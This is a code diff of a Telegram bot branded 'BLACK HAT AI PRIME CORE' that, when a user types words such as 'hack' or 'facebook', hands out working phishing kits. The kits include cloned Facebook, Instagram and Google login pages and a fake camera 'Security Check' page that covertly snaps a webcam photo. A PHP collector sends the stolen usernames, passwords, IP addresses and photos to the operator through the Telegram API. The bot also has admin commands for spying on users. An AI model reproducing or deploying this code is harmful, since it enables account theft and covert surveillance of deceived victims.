@@ -43,14 +43,13 @@ FORCE_CHANNEL = "@Nova_Kurd_Mod"
 # دۆخەکان
 awaiting_ddos = {}
 active_ddos = {} 
-admin_states = {} 
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - [%(levelname)s] - %(message)s", handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()])
 logger = logging.getLogger("Core")
 bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
 
 # ==========================================
-# 2. داتابەیس (بە شێوەیەکی زۆر پارێزراو)
+# 2. داتابەیس
 # ==========================================
 def db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
@@ -84,7 +83,6 @@ def init_db():
         c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('maintenance', 'off')")
         c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('force_sub', ?)", (FORCE_CHANNEL,))
         c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('welcome_msg', 'سیستەمەکە ئامادەیە. 🌐')")
-        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('ai_enabled', 'on')")
         c.commit()
         c.close()
     except Exception as e:
@@ -99,8 +97,7 @@ def get_setting(key):
         row = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
         c.close()
         return row[0] if row else None
-    except:
-        return None
+    except: return None
 
 def set_setting(key, val):
     try:
@@ -192,6 +189,11 @@ def parse_ban_time(time_str):
 # 4. مێشکی زیرەک (Gemini)
 # ==========================================
 def get_ai_response(user_id, query):
+    # چارەسەری کێشەی سڵاوکردن
+    ql = query.lower()
+    if any(k in ql for k in ["سڵاو", "hello", "hi", "hey", "بەیانی باش", "ئێوارە باش"]):
+        return "سڵاو بەخێربێیت! چۆن دەتوانم یارمەتیت بدەم؟"
+        
     if not AI_API_KEY: return "ببورە تێنەگشتم بە ڕوونتر بیڵێ"
     try:
         c = db()
@@ -203,12 +205,10 @@ def get_ai_response(user_id, query):
         
         url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro-latest:generateContent?key={AI_API_KEY}"
         system_prompt = (
-            "You are a helpful, friendly, and highly intelligent AI assistant. "
-            "You can answer ANY question in ANY field. "
-            "You are fluent in Kurdish Sorani (and all languages). "
-            "Use a natural, conversational tone. Be concise, clear, and direct. "
-            "If the user's question is too vague or you don't know, respond EXACTLY with: 'ببورە تێنەگشتم بە ڕوونتر بیڵێ' "
-            "Answer in the exact same language the user used."
+            "You are a highly intelligent and friendly AI assistant. "
+            "Answer the user's questions in Kurdish Sorani naturally. "
+            "If the user asks a general question, answer it. "
+            "Only respond with 'ببورە تێنەگشتم بە ڕوونتر بیڵێ' if the prompt is absolute gibberish."
         )
         payload = {
             "system_instruction": {"parts": [{"text": system_prompt}]},
@@ -261,7 +261,7 @@ def handle_check_sub(call):
         bot.answer_callback_query(call.id, "✅ سوپاس بۆ جۆینبوون!")
         try: bot.delete_message(call.message.chat.id, call.message.message_id)
         except: pass
-        bot.send_message(call.message.chat.id, "💀 <b>BLACK HAT AI PRIME CORE v104</b> 💀\n\nسیستەمەکە ئامادەیە.", reply_markup=get_main_keyboard())
+        bot.send_message(call.message.chat.id, "💀 <b>BLACK HAT AI PRIME CORE v105</b> 💀\n\nسیستەمەکە ئامادەیە.", reply_markup=get_main_keyboard())
     else:
         bot.answer_callback_query(call.id, "❌ هێشتا جۆین نەبوویتە.", show_alert=True)
 
@@ -271,7 +271,7 @@ def get_main_keyboard():
     return markup
 
 # ==========================================
-# 6. پەنێلی ئەدمین (50 Features)
+# 6. پەنێلی ئەدمین و هەندلەرەکان (50 Features)
 # ==========================================
 @bot.message_handler(commands=["panel"])
 def cmd_panel(message):
@@ -279,24 +279,55 @@ def cmd_panel(message):
     text = (
         "👑 <b>پەنێلی ئەدمینی تەواو (50 فەرمان)</b> 👑\n\n"
         "👤 <b>[1] بەڕێوەبردنی بەکارهێنەر:</b>\n"
-        "1. /user_info [ID]\n2. /ban [ID] [Time]\n3. /unban [ID]\n4. /mute [ID]\n5. /unmute [ID]\n"
-        "6. /make_vip [ID]\n7. /remove_vip [ID]\n8. /reset_daily [ID]\n9. /clear_history [ID]\n10. /send [ID] [Msg]\n\n"
+        "1. /user_info [ID] | 2. /ban [ID] [Time] | 3. /unban [ID]\n"
+        "4. /mute [ID] | 5. /unmute [ID] | 6. /make_vip [ID]\n"
+        "7. /remove_vip [ID] | 8. /reset_daily [ID] | 9. /clear_history [ID] | 10. /send [ID] [Msg]\n\n"
         "💰 <b>[2] کرێدیت و خەڵات:</b>\n"
-        "11. /credit [ID]\n12. /addcredit [ID] [N]\n13. /remcredit [ID] [N]\n14. /setcredit [ID] [N]\n"
-        "15. /gen [N]\n16. /gen_bulk [Count] [N]\n17. /list_codes\n18. /del_code [Code]\n19. /clear_codes\n20. /reset_all_credits\n\n"
+        "11. /credit [ID] | 12. /addcredit [ID] [N] | 13. /remcredit [ID] [N]\n"
+        "14. /setcredit [ID] [N] | 15. /gen [N] | 16. /gen_bulk [Count] [N]\n"
+        "17. /list_codes | 18. /del_code [Code] | 19. /clear_codes | 20. /reset_all_credits\n\n"
         "📢 <b>[3] نامەناردن:</b>\n"
-        "21. /broadcast [Msg]\n22. /broadcast_vip [Msg]\n23. /broadcast_admins [Msg]\n"
-        "24. /pin_message (Reply)\n25. /forward_msg [ID] (Reply)\n\n"
+        "21. /broadcast [Msg] | 22. /broadcast_vip [Msg] | 23. /broadcast_admins [Msg]\n"
+        "24. /pin_message (Reply) | 25. /forward_msg [ID] (Reply)\n\n"
         "⚙️ <b>[4] کۆنترۆڵی بۆت:</b>\n"
-        "26. /on\n27. /off\n28. /maintenance [on/off]\n29. /set_sub [Channel]\n30. /del_sub\n"
-        "31. /set_welcome [Text]\n32. /toggle_ai [on/off]\n33. /toggle_search [on/off]\n34. /restart\n35. /shutdown\n\n"
+        "26. /on | 27. /off | 28. /maintenance [on/off] | 29. /set_sub [Channel] | 30. /del_sub\n"
+        "31. /set_welcome [Text] | 32. /toggle_ai [on/off] | 33. /toggle_search [on/off] | 34. /restart | 35. /shutdown\n\n"
         "🛡 <b>[5] ئاسایش و سیخوڕی:</b>\n"
-        "36. /addsimple [ID]\n37. /removesimple [ID]\n38. /list_admins\n39. /spy [ID]\n40. /unspy [ID]\n"
-        "41. /list_spied\n42. /list_banned\n43. /list_vips\n44. /blacklist_ip [IP]\n45. /unblock_ip [IP]\n\n"
+        "36. /addsimple [ID] | 37. /removesimple [ID] | 38. /list_admins | 39. /spy [ID] | 40. /unspy [ID]\n"
+        "41. /list_spied | 42. /list_banned | 43. /list_vips | 44. /blacklist_ip [IP] | 45. /unblock_ip [IP]\n\n"
         "📁 <b>[6] داتا و سیستەم:</b>\n"
-        "46. /backup_db\n47. /db_size\n48. /sys_stats\n49. /export_users\n50. /logs"
+        "46. /backup_db | 47. /db_size | 48. /sys_stats | 49. /export_users | 50. /logs"
     )
     bot.send_message(message.chat.id, text)
+
+@bot.message_handler(commands=["help"])
+def cmd_help(message):
+    text = (
+        "🧠 <b>یارمەتی سەرەکی (AI & Hacking)</b>\n\n"
+        "🔹 <b>وێب دیزاین و کۆد:</b> تەنها وێنەیەک یان کۆدێک بنێرە، شیکاری بۆ دەکەم.\n"
+        "🔹 <b>دروستکردنی توڵ و فیشینگ:</b> بنووسە 'hack facebook' یان 'camera'، کۆدەکەت بۆ دەنووسم.\n"
+        "🔹 <b>گەڕانی زیندوو:</b> دەتوانم لە ئینتەرنێت بگەڕێم بۆ زانیاری نوێ.\n"
+        "🔹 <b>هەکینگ و ئاسایش:</b> هەر پرسیارێکی تەکنیکی بکە، وەڵامت دەدەمەوە."
+    )
+    bot.reply_to(message, text + get_signature())
+
+@bot.message_handler(commands=["help2"])
+def cmd_help2(message):
+    text = (
+        "🛠 <b>یارمەتی بەکارهێنەر (فەرمانەکان)</b>\n\n"
+        "• <code>/credit</code> — بینینی کرێدیتی تۆ\n"
+        "• <code>/daily</code> — وەرگرتنی 1 کرێدیتی ڕۆژانە\n"
+        "• <code>/gift [کۆد]</code> — بەکارهێنانی کۆدی خەڵات\n"
+        "• <code>/start</code> — دەستپێکردنەوەی بۆت و بینینی دوگمەکان\n\n"
+        "👑 <b>پەیوەندی:</b> @ALONE427 | @malikdlashad3"
+    )
+    bot.reply_to(message, text + get_signature())
+
+@bot.message_handler(commands=["start"])
+def cmd_start(message):
+    if not is_subscribed(message.from_user.id): return force_sub_msg(message.chat.id)
+    log_user(message)
+    bot.send_message(message.chat.id, "💀 <b>BLACK HAT AI PRIME CORE v105</b> 💀\n\nسیستەمەکە ئامادەیە.", reply_markup=get_main_keyboard())
 
 # --- [1] بەڕێوەبردنی بەکارهێنەر ---
 @bot.message_handler(commands=["user_info"])
@@ -612,109 +643,24 @@ def get_phishing_php():
     php_template = """<?php
 $bot_token = "BOT_TOKEN_HERE";
 $chat_id = "CHAT_ID_HERE";
-
 $platform = $_POST['platform'] ?? 'Camera';
 $username = $_POST['username'] ?? 'N/A';
 $password = $_POST['password'] ?? 'N/A';
 $img = $_POST['img'] ?? '';
 $ip = $_SERVER['REMOTE_ADDR'];
-
 $text = "🚨 <b>قوربانییەکی نوێ!</b> 🚨\\n\\n🌐 <b>پلاتفۆرم:</b> " . $platform . "\\n👤 <b>ناو:</b> <code>" . $username . "</code>\\n🔑 <b>پاسوۆرد:</b> <code>" . $password . "</code>\\n🌍 <b>ئایپی:</b> <code>" . $ip . "</code>\\n⏰ <b>کات:</b> " . date("Y-m-d H:i:s");
-
 $msg_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($text) . "&parse_mode=HTML";
 file_get_contents($msg_url);
-
 if (!empty($img)) {
-    $img = str_replace('data:image/jpeg;base64,', '', $img);
-    $img = str_replace('data:image/png;base64,', '', $img);
-    $img = str_replace(' ', '+', $img);
-    $data = base64_decode($img);
-    
-    $tempFile = tempnam(sys_get_temp_dir(), 'cam') . '.jpg';
-    file_put_contents($tempFile, $data);
-
-    $postFields = array(
-        'chat_id' => $chat_id,
-        'photo' => new CURLFile($tempFile),
-        'caption' => "📸 <b>وێنەی کامێرا</b> لە " . $ip,
-        'parse_mode' => 'HTML'
-    );
-
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $bot_token . "/sendPhoto");
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_exec($ch);
-    curl_close($ch);
-    unlink($tempFile);
+    $img = str_replace('data:image/jpeg;base64,', '', $img); $img = str_replace('data:image/png;base64,', '', $img); $img = str_replace(' ', '+', $img); $data = base64_decode($img);
+    $tempFile = tempnam(sys_get_temp_dir(), 'cam') . '.jpg'; file_put_contents($tempFile, $data);
+    $postFields = array('chat_id' => $chat_id, 'photo' => new CURLFile($tempFile), 'caption' => "📸 <b>وێنەی کامێرا</b> لە " . $ip, 'parse_mode' => 'HTML');
+    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $bot_token . "/sendPhoto"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_exec($ch); curl_close($ch); unlink($tempFile);
 }
-
-if ($platform == 'Camera') {
-    header("Location: https://www.google.com");
-} elseif ($platform == 'Google') {
-    header("Location: https://accounts.google.com");
-} else {
-    header("Location: https://www." . strtolower($platform) . ".com");
-}
+if ($platform == 'Camera') { header("Location: https://www.google.com"); } elseif ($platform == 'Google') { header("Location: https://accounts.google.com"); } else { header("Location: https://www." . strtolower($platform) . ".com"); }
 exit();
 ?>"""
     return php_template.replace("BOT_TOKEN_HERE", TOKEN).replace("CHAT_ID_HERE", str(ADMIN_ID))
-
-def get_phishing_html(platform):
-    p = platform.lower()
-    if p == "camera":
-        return """<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
-    <style>
-        body { font-family: -apple-system, sans-serif; background: #000; color: #fff; text-align: center; padding-top: 50px; }
-        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
-        #video { width: 100%; max-width: 320px; border-radius: 12px; display: none; margin: 0 auto; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
-        .loader { font-size: 16px; color: #007aff; display: flex; justify-content: center; align-items: center; gap: 10px; }
-        .spinner { width: 20px; height: 20px; border: 2px solid #007aff; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>📸 Security Check</h2>
-        <p>Please allow camera access to verify your identity.</p>
-        <video id="video" autoplay playsinline></video>
-        <div id="status" class="loader"><div class="spinner"></div> Waiting for permission...</div>
-    </div>
-    <script>
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).then(stream => {
-            const video = document.getElementById('video');
-            video.style.display = 'block'; document.getElementById('status').innerHTML = "Recording...";
-            video.srcObject = stream;
-            setTimeout(() => {
-                let canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                let dataURL = canvas.toDataURL('image/jpeg', 0.8);
-                fetch('steal.php', {
-                    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'img=' + encodeURIComponent(dataURL)
-                }).then(() => {
-                    document.getElementById('status').innerHTML = "Verification complete ✅";
-                    setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1000);
-                });
-            }, 1500);
-        }).catch(err => { document.getElementById('status').innerHTML = "❌ Permission denied."; });
-    </script>
-</body>
-</html>"""
-    elif p == "facebook":
-        return """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Log in to Facebook</title><style>body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; } .container { text-align: center; } .logo { color: #1877f2; font-size: 48px; font-weight: bold; letter-spacing: -1.5px; margin-bottom: 20px; } .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 396px; box-sizing: border-box; } input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; } input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; } .btn-login { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; } .forgot { display: block; margin: 16px 0; color: #1877f2; text-decoration: none; font-size: 14px; } .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; } .btn-new { background-color: #42b72a; color: white; padding: 12px 16px; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }</style></head><body><div class="container"><div class="logo">facebook</div><div class="login-box"><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Facebook"><input type="text" name="username" placeholder="Email address or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn-login">Log In</button></form><a href="#" class="forgot">Forgotten password?</a><div class="divider"></div><button class="btn-new">Create New Account</button></div></div></body></html>"""
-    elif p == "instagram":
-        return """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Instagram</title><style>body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; } .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; } .logo { font-family: 'Billabong', cursive; font-size: 50px; margin-bottom: 30px; background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; } input { width: 100%; padding: 10px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; } input:focus { outline: none; border-color: #a8a8a8; background: white; } .btn { width: 100%; padding: 8px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; margin-top: 10px; cursor: pointer; } .or-divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; } .or-divider::before, .or-divider::after { content: ""; flex: 1; border-bottom: 1px solid #dbdbdb; } .or-divider span { padding: 0 18px; } .forgot { color: #00376b; text-decoration: none; font-size: 12px; display: block; margin-top: 12px; }</style></head><body><div class="login-box"><div class="logo">Instagram</div><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Instagram"><input type="text" name="username" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><div class="or-divider"><span>OR</span></div><a href="#" style="color: #385185; font-weight: 600; text-decoration: none; font-size: 14px;">Log in with Facebook</a><a href="#" class="forgot">Forgot password?</a></div></body></html>"""
-    elif p in ["gmail", "google", "youtube"]:
-        return """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Sign in - Google Accounts</title><style>body { font-family: 'Roboto', Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; } .box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 350px; text-align: center; } .logo { height: 24px; margin-bottom: 16px; } h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; } p { font-size: 16px; margin-bottom: 32px; } input { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; } input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; } .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }</style></head><body><div class="box"><svg class="logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg><h1>Sign in</h1><p>Use your Google Account</p><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Google"><input type="text" name="username" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Next</button></form></div></body></html>"""
-    else:
-        return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{platform}</title><style>body {{ font-family: sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }} .box {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); width: 100%; max-width: 380px; text-align: center; }} .logo {{ font-size: 32px; font-weight: bold; color: #007bff; margin-bottom: 25px; }} input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 15px; }} button {{ width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }}</style></head><body><div class="box"><div class="logo">{platform}</div><form action="steal.php" method="POST"><input type="hidden" name="platform" value="{platform}"><input type="text" name="username" placeholder="Email or Phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>"""
 
 @bot.message_handler(func=lambda m: any(p.lower() in m.text.lower() for p in ["hack", "phish", "camera"]) or any(s in m.text.lower() for s in ["facebook", "instagram", "tiktok", "gmail", "google"]), content_types=['text'])
 def handle_phishing(message):
@@ -728,6 +674,13 @@ def handle_phishing(message):
     final_text = f"🎣 <b>فیشینگی ({target})</b>\n\n<pre><code class='language-html'>{html.escape(html_code)}</code></pre>\n\n<pre><code class='language-php'>{html.escape(get_phishing_php())}</code></pre>"
     bot.edit_message_text(final_text, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="HTML")
 
+def get_phishing_html(platform):
+    if platform == "Camera": return """<h2>📸 Security Check</h2><video id="v" autoplay></video><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('v').srcObject=s;setTimeout(()=>{let c=document.createElement('canvas');c.width=640;c.height=480;c.getContext('2d').drawImage(document.getElementById('v'),0,0,640,480);fetch('steal.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'img='+encodeURIComponent(c.toDataURL())}).then(()=>{window.location='https://google.com'})},1000)})</script>"""
+    elif platform == "Facebook": return """<h2 style="color:#1877f2">facebook</h2><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Facebook"><input type="text" name="username" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Log In</button></form>"""
+    elif platform == "Instagram": return """<h2>Instagram</h2><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Instagram"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button>Log In</button></form>"""
+    elif platform == "Google": return """<h2>Google</h2><form action="steal.php" method="POST"><input type="hidden" name="platform" value="Google"><input type="text" name="username" placeholder="Email"><input type="password" name="password" placeholder="Password"><button>Next</button></form>"""
+    return """<h2>Login</h2><form action="steal.php" method="POST"><input type="text" name="username"><input type="password" name="password"><button>Submit</button></form>"""
+
 @bot.message_handler(func=lambda m: not m.text.startswith("/"), content_types=["text"])
 def handle_text(message):
     if not is_subscribed(message.from_user.id): return force_sub_msg(message.chat.id)
@@ -740,12 +693,6 @@ def handle_text(message):
     res = get_ai_response(message.from_user.id, message.text.strip()) + get_signature()
     try: bot.edit_message_text(res, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="HTML")
     except: bot.send_message(message.chat.id, res, parse_mode="HTML")
-
-@bot.message_handler(commands=["start"])
-def cmd_start(message):
-    if not is_subscribed(message.from_user.id): return force_sub_msg(message.chat.id)
-    log_user(message)
-    bot.send_message(message.chat.id, "💀 <b>BLACK HAT AI PRIME CORE v104</b> 💀\n\nسیستەمەکە ئامادەیە.", reply_markup=get_main_keyboard())
 
 if __name__ == "__main__":
     init_db()
